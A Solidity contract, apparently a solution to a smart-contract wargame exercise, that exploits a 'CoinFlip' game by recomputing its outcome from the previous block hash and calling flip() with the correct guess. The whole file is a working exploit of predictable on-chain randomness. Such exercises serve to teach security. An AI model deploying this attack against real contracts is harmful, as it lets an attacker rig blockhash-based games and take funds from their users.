// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;
import "./../src/CoinFlip.sol";

contract CoinFlipAttack {
    CoinFlip public coinFlipContract;
    address public attacker;
    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    modifier onlyAttacker() {
        require(msg.sender == attacker);
        _;
    }

    constructor(address _coinFlipAddress) {
        coinFlipContract = CoinFlip(_coinFlipAddress);
        attacker = msg.sender;
    }

    function attack() external onlyAttacker {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;
        coinFlipContract.flip(guess);
    }
}
